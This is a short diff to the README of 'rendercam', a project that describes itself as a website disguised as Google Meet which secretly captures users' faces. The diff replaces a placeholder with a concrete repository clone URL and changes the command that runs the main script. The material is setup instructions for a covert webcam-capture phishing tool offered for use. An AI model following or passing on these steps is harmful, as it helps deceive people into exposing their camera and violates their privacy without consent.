@@ -9,14 +9,14 @@ A website disguised as Google Meet that secretly captures user's faces.
 1.  Clone the repository:
 
     ```bash
-    git clone [repository URL]
+    git clone https://github.com/render437/rendercam.git
     cd rendercam
     ```
 
 2.  Run the main script:
 
     ```bash
-    python scripts/main.py
+    python main.py
     ```
 
 ## Usage
